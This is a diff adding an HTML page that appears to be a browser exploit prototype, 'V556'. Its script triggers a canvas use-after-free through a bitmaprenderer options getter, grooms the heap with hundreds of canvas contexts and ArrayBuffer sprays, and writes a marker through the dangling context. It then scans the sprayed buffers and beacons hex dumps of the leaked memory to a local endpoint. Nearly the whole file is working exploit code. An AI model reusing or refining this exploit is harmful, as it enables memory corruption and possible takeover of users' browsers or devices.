@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V556</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V556-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+function triggerUAF(canvas){
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=canvas.getContext('2d');
+      return true;
+    }
+  });
+  canvas.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V556-groom-save');
+
+// ============================================================
+// STRATEGY: Heavy heap grooming to ensure AB reclaims the exact
+// freed Canvas2D slot. Then test if save() works on zeroed data.
+//
+// T1: Alias baseline (MUST pass — validates UAF + reclaim working)
+// T2: Exhaust 768B free list, then UAF + AB spray + save
+// T3: If T2 passes — scan ABs for marker value (m_unrealizedSaveCount)
+// ============================================================
+
+// T1: ALIAS BASELINE — confirms same-type reclaim works
+(function T1(){
+  b('T1-START','alias-baseline');
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var ctxD=triggerUAF(c);
+  // Reclaim with fresh Canvas2D
+  var c2=document.createElement('canvas');
+  c2.width=1;c2.height=1;
+  var ctxN=c2.getContext('2d');
+  ctxN.lineWidth=77;
+  var lw;
+  try{lw=ctxD.lineWidth;}catch(e){lw='ERR:'+e.message}
+  b('T1-RESULT','ctxD.lw='+lw+' (expect 77)');
+})();
+
+// T2: GROOMED DOUBLE-UAF + AB SPRAY + SAVE
+(function T2(){
+  b('T2-START','groomed-save');
+
+  // Phase 1: Fill the 768B free list by creating many Canvas2D contexts
+  // then freeing them. This ensures our target slot is near the HEAD
+  // of the free list when we do the UAF.
+  var drainCanvases=[];
+  var drainCtxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');
+    c.width=1;c.height=1;
+    drainCanvases.push(c);
+    drainCtxs.push(c.getContext('2d'));
+  }
+  b('T2-DRAIN','200 contexts allocated');
+
+  // Free all drain contexts (replace with bitmaprenderer)
+  for(var i=0;i<200;i++){
+    drainCanvases[i].getContext('bitmaprenderer');
+  }
+  drainCtxs=null;
+  b('T2-FREE','200 contexts freed → 200 slots in 768B free list');
+
+  // Phase 2: Reclaim most of them with ABs → leaves only a few free
+  var plugABs=[];
+  for(var i=0;i<195;i++){
+    plugABs.push(new ArrayBuffer(768));
+  }
+  b('T2-PLUG','195 ABs plugged free list (5 slots remain)');
+
+  // Phase 3: Create the UAF + alias pair
+  var cTarget=document.createElement('canvas');
+  cTarget.width=1;cTarget.height=1;
+  var ctxD=triggerUAF(cTarget);
+  b('T2-UAF','dangling='+(ctxD?'ok':'null'));
+
+  // ctxD points to freed memory in one of the ~5 remaining free slots
+  // The context allocated during UAF (in getter) used one slot,
+  // then the bitmaprenderer freed it → back to 5 free slots.
+
+  // Phase 4: Spray ABs to reclaim the freed slot
+  var sprayABs=[];
+  for(var i=0;i<20;i++){
+    sprayABs.push(new ArrayBuffer(768));
+  }
+  b('T2-SPRAY','20 ABs sprayed into remaining 5 free slots');
+
+  // Phase 5: Try save() through dangling wrapper
+  // If the AB reclaimed the slot, all bytes are 0.
+  // save() = ++m_unrealizedSaveCount (uint32 at some offset)
+  // If there's NO Sony validity check, this should write 1 to the AB.
+  b('T2-PRESAVE','about to call save()');
+  try{
+    ctxD.save();
+    b('T2-SAVE','PASS!!!');
+
+    // Phase 6: Call save() multiple more times to write a recognizable marker
+    for(var j=0;j<41;j++) ctxD.save(); // total 42 saves
+    b('T2-MARKER','42 saves done');
+
+    // Phase 7: Scan spray ABs for value 42 (uint32)
+    var found=-1;
+    var foundOffset=-1;
+    for(var a=0;a<sprayABs.length;a++){
+      var u32=new Uint32Array(sprayABs[a]);
+      for(var off=0;off<192;off++){
+        if(u32[off]===42){
+          found=a;
+          foundOffset=off*4;
+          break;
+        }
+      }
+      if(found>=0) break;
+    }
+    b('T2-SCAN','found='+found+' offset='+foundOffset);
+
+    // Phase 8: Hex dump of the identified AB
+    if(found>=0){
+      var u8=new Uint8Array(sprayABs[found]);
+      var hex='';
+      for(var j=0;j<Math.min(768,u8.length);j++){
+        hex+=(u8[j]<16?'0':'')+u8[j].toString(16);
+        if(j%64===63) hex+='|';
+      }
+      b('T2-HEX',hex);
+    }
+  }catch(e){
+    b('T2-SAVE-ERR',e.message);
+  }
+  b('T2-DONE','ok');
+})();
+
+// T3: SAME as T2 but with even more aggressive grooming (500 contexts)
+(function T3(){
+  b('T3-START','aggressive-groom');
+  var dc=[];
+  for(var i=0;i<500;i++){
+    var c=document.createElement('canvas');
+    c.width=1;c.height=1;
+    dc.push(c);
+    c.getContext('2d');
+  }
+  for(var i=0;i<500;i++){
+    dc[i].getContext('bitmaprenderer');
+  }
+  b('T3-DRAIN','500 freed');
+
+  // Plug all but 3
+  var plugs=[];
+  for(var i=0;i<497;i++) plugs.push(new ArrayBuffer(768));
+  b('T3-PLUG','497 plugged');
+
+  // UAF
+  var ct=document.createElement('canvas');
+  ct.width=1;ct.height=1;
+  var ctxD=triggerUAF(ct);
+
+  // Spray 10 ABs (should hit the 3 remaining + our freed)
+  var sABs=[];
+  for(var i=0;i<10;i++) sABs.push(new ArrayBuffer(768));
+
+  b('T3-PRESAVE','about to save');
+  try{
+    ctxD.save();
+    b('T3-SAVE','PASS!!!');
+    for(var j=0;j<41;j++) ctxD.save();
+
+    var found=-1,foff=-1;
+    for(var a=0;a<sABs.length;a++){
+      var u32=new Uint32Array(sABs[a]);
+      for(var off=0;off<192;off++){
+        if(u32[off]===42){found=a;foff=off*4;break;}
+      }
+      if(found>=0)break;
+    }
+    b('T3-SCAN','found='+found+' offset='+foff);
+
+    if(found>=0){
+      var u8=new Uint8Array(sABs[found]);
+      var hex='';
+      for(var j=0;j<128;j++){
+        hex+=(u8[j]<16?'0':'')+u8[j].toString(16);
+      }
+      b('T3-HEX',hex);
+    }
+  }catch(e){
+    b('T3-SAVE-ERR',e.message);
+  }
+  b('T3-DONE','ok');
+})();
+
+b('DONE','V556-all-complete');
+</script>
+</body></html>
